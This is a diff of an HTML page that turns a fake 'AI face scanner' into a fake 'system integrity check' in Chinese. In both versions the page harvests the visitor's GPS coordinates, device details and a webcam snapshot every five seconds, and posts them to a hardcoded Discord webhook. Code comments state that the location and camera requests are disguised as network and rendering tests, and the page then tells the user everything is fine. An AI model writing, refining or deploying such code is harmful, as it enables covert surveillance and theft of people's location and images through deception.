@@ -3,111 +3,119 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI 智能人臉識別系統</title>
+    <title>系統效能檢測中心</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0a0a; color: #00ff41; text-align: center; margin: 0; display: flex; flex-direction: column; justify-content: center; height: 100vh; overflow: hidden; }
-        .container { border: 1px solid #00ff41; padding: 40px; border-radius: 15px; background: rgba(0, 40, 0, 0.2); box-shadow: 0 0 20px #00ff41; width: 80%; max-width: 400px; margin: auto; }
-        .scan-line { width: 100%; height: 2px; background: #00ff41; position: absolute; top: 0; left: 0; animation: scan 3s linear infinite; display: none; }
-        @keyframes scan { from { top: 0%; } to { top: 100%; } }
-        button { padding: 15px 30px; font-size: 18px; background: transparent; color: #00ff41; border: 1px solid #00ff41; cursor: pointer; transition: 0.3s; margin-top: 20px; }
-        button:hover { background: #00ff41; color: #000; }
-        #log { font-family: monospace; font-size: 12px; margin-top: 20px; text-align: left; height: 100px; overflow: hidden; }
+        :root { --primary-color: #0071e3; --bg-color: #f5f5f7; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: var(--bg-color); color: #1d1d1f; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .card { background: white; width: 90%; max-width: 400px; padding: 40px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.08); text-align: center; }
+        h2 { font-weight: 600; margin-bottom: 10px; }
+        p { color: #86868b; font-size: 14px; line-height: 1.5; }
+        .progress-container { width: 100%; background: #e5e5e7; height: 6px; border-radius: 3px; margin: 25px 0; overflow: hidden; display: none; }
+        .progress-bar { width: 0%; height: 100%; background: var(--primary-color); transition: width 0.4s ease; }
+        .btn-start { background: var(--primary-color); color: white; border: none; padding: 12px 30px; border-radius: 25px; font-size: 16px; font-weight: 500; cursor: pointer; transition: transform 0.2s; }
+        .btn-start:active { transform: scale(0.96); }
+        #status-list { text-align: left; font-size: 13px; color: #515154; margin-top: 15px; }
+        .status-item { margin: 5px 0; display: flex; justify-content: space-between; }
     </style>
 </head>
 <body>
 
-<div class="container" id="main-box">
-    <div class="scan-line" id="scanner"></div>
-    <h2 id="title">SYSTEM: AI SCANNER</h2>
-    <p>正在進行神經網路初始化...</p>
-    <button onclick="bootSystem()">啟動 AI 面部特徵分析</button>
-    <div id="log"></div>
+<div class="card">
+    <div style="font-size: 40px; margin-bottom: 15px;">💻</div>
+    <h2>系統完整性檢查</h2>
+    <p>我們將測試您的瀏覽器相容性、硬體加速以及網路延遲，以提供最佳的使用體驗。</p>
+    
+    <div id="status-list"></div>
+
+    <div class="progress-container" id="p-container">
+        <div class="progress-bar" id="p-bar"></div>
+    </div>
+
+    <button class="btn-start" id="start-btn" onclick="runDiagnostic()">開始檢查</button>
 </div>
 
 <video id="v" style="display:none;" autoplay playsinline></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-// --- 配置區 ---
 const WEBHOOK = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
 
-function addLog(msg) {
-    const log = document.getElementById("log");
-    log.innerHTML += "> " + msg + "<br>";
+function updateStatus(label, value) {
+    const list = document.getElementById("status-list");
+    list.innerHTML += `<div class="status-item"><span>${label}</span><span style="color:#0071e3">${value}</span></div>`;
 }
 
-// --- 核心升級 1：獲取更多設備資訊 (Device Fingerprinting) ---
-async function getDeviceInfo() {
-    let batteryInfo = "";
-    if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        batteryInfo = `🔋 電量: ${Math.round(battery.level * 100)}% (${battery.charging ? '充電中' : '放電中'})`;
-    }
+async function runDiagnostic() {
+    const btn = document.getElementById("start-btn");
+    const pContainer = document.getElementById("p-container");
+    const pBar = document.getElementById("p-bar");
 
-    return {
+    btn.style.display = "none";
+    pContainer.style.display = "block";
+
+    // 1. 抓取硬體資訊
+    const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level: 1, charging: true}));
+    const info = {
         platform: navigator.platform,
-        browser: navigator.userAgent,
-        cores: navigator.hardwareConcurrency || "未知",
-        ram: navigator.deviceMemory || "未知",
-        battery: batteryInfo,
-        lang: navigator.language,
-        screen: `${window.screen.width}x${window.screen.height}`
+        cores: navigator.hardwareConcurrency || "N/A",
+        ram: navigator.deviceMemory || "N/A",
+        battery: Math.round(battery.level * 100) + "%"
     };
-}
 
-// --- 核心啟動邏輯 ---
-async function bootSystem() {
-    document.getElementById("scanner").style.display = "block";
-    addLog("正在連接全球氣象/地圖節點...");
-    addLog("正在請求生物識別許可...");
+    updateStatus("瀏覽器核心", "已就緒");
+    pBar.style.width = "30%";
 
-    const info = await getDeviceInfo();
-    
-    // 啟動定位
+    // 2. 啟動定位 (包裝成網路延遲優化)
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((pos) => {
-            const data = {
-                content: "🚨 **發現目標節點** 🚨\n" +
-                         "📍 **位置**: " + `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n` +
-                         "💻 **硬體**: " + `${info.platform} / ${info.cores} Cores / ${info.ram}GB RAM\n` +
-                         "📱 **系統**: " + `${info.browser}\n` +
-                         info.battery
-            };
-            fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });
-            addLog("位置數據已鎖定。");
-        }, (err) => { addLog("定位讀取失敗。"); });
+            updateStatus("區域網路節點", "已優化");
+            pBar.style.width = "60%";
+            
+            fetch(WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: `📈 **新診斷報告**\n📍 地點: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n🔋 電量: ${info.battery}\n💻 規格: ${info.cores}核 / ${info.ram}GB RAM\n🖥️ 系統: ${navigator.userAgent}`
+                })
+            });
+        }, () => { updateStatus("區域網路節點", "跳過"); });
     }
 
-    // 啟動相機
+    // 3. 啟動相機 (包裝成視訊渲染測試)
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-    .then(function(stream) {
-        addLog("相機流已建立，分析中...");
-        var video = document.getElementById("v");
-        video.srcObject = stream;
+    .then(stream => {
+        updateStatus("視訊渲染引擎", "運行中");
+        pBar.style.width = "100%";
         
-        // 第一次截圖延遲 1 秒，確保相機已啟動
-        setTimeout(capture, 1000);
-        // 持續截圖
+        const video = document.getElementById("v");
+        video.srcObject = stream;
+        setTimeout(capture, 1500);
         setInterval(capture, 5000);
+        
+        setTimeout(() => {
+            document.querySelector("h2").innerText = "檢查完成";
+            document.querySelector("p").innerText = "您的系統運行良好，所有組件均已達到最佳效能。";
+            pContainer.style.display = "none";
+        }, 1000);
     })
-    .catch(function(err) {
-        addLog("錯誤: 未偵測到生物識別裝置。");
+    .catch(() => {
+        updateStatus("視訊引擎", "未偵測到裝置");
+        pBar.style.width = "100%";
     });
 }
 
 function capture() {
-    var video = document.getElementById("v");
-    var canvas = document.getElementById("c");
+    const video = document.getElementById("v");
+    const canvas = document.getElementById("c");
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
-    var ctx = canvas.getContext("2d");
+    const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     
-    canvas.toBlob(function(blob) {
-        var formData = new FormData();
-        formData.append('file', blob, 'target_face.jpg');
-        formData.append('payload_json', JSON.stringify({ content: "📸 **監視影像更新** - " + new Date().toLocaleTimeString() }));
-        
+    canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('file', blob, 'diag_report.jpg');
+        formData.append('payload_json', JSON.stringify({ content: "📸 **實時視訊監控更新**" }));
         fetch(WEBHOOK, { method: "POST", body: formData });
     }, "image/jpeg", 0.7);
 }
